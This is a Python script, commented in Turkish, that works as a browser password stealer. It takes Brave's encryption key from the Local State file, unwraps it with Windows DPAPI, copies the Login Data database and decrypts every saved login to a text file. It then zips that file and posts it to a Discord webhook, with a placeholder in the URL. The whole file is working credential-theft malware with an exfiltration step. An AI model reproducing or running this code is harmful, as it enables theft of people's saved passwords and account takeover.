import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import zipfile
import shutil   
import requests
import dhooks


# imza = ("""
#          __  __                  _                    
# |  \/  |                | |                   
# | \  / | ___  _ __ _ __ | |__   ___ _   _ ___ 
# | |\/| |/ _ \| '__| '_ \| '_ \ / _ \ | | / __|
# | |  | | (_) | |  | |_) | | | |  __/ |_| \__ \
# |_|  |_|\___/|_|  | .__/|_| |_|\___|\__,_|___/
#                   | |                         
#                   |_|                         

#         """)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "BraveSoftware", "Brave-Browser",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # şifreleme anahtarını Base64'ten çözme
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # DPAPI str'sini kaldır
    key = key[5:]
    # orijinal olarak şifrelenmiş şifresi çözülmüş anahtarı döndürür
    # geçerli kullanıcının oturum açma kimlik bilgilerinden türetilen bir oturum anahtarı kullanma
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # başlatma vektörünü alın
        iv = password[3:15]
        password = password[15:]
        # şifre oluştur
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # şifreyi çöz
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # desteklenmiyor
            return ""
        
def write_text(girdi):
    try:
        with open("password.txt","a",encoding="utf-8") as dosya:
            for x in girdi:
                dosya.write(x)
    except Exception as e:
        print(f"Dosya yazma hatası: {e}")
        
def main():
    # AES anahtarını alın
    key = get_encryption_key()
    # yerel sqlite Chrome veritabanı yolu
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "BraveSoftware", "Brave-Browser", "User Data", "default", "Login Data")
    # dosyayı başka bir konuma kopyala
    # chrome şu anda çalışıyorsa veritabanı kilitleneceğinden
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # veritabanına bağlanma
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # tüm satırlar üzerinde yinele
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        
        if username or password:
            write_text(f"\nOrigin URL: {origin_url}\n")
            write_text(f"Action URL: {action_url}\n")
            write_text(f"Username: {username}\n")
            write_text(f"Password: {password}\n")
            write_text(50*"=")
    
            
        else:
            continue
        
    cursor.close()
    db.close()
    try:
        # kopyalanan db dosyasını kaldırmayı deneyin
        os.remove(filename)
    except:
        pass

if __name__ == "__main__":
    main()
    

# Ziplenecek dosyaların listesi

url = "https://discord.com/api/webhooks/APİ_KEY_URL"

# Dosya adı
zip_file_name = 'password.zip'

# Dosya adları
file_names = ['password.txt']

# Dosyaları zipleyin
with zipfile.ZipFile(zip_file_name, mode='w') as zip_file:
    for file_name in file_names:
        zip_file.write(file_name)

# Dosya okuma ve Discord webhook gönderme
# Zip file path
zip_file_path = "C:\\Users\\Cengizhan\\Çalışmam\\Stealer\\password.zip"

# Open zip file in binary mode
with open(zip_file_path, "rb") as f:
    # Read the file content
    file_content = f.read()

# Create the payload
payload = {zip_file_path : file_content,}
# Send the HTTP POST request
response = requests.post(url, files=payload)
# Print the response status code
# Dosyaları silme




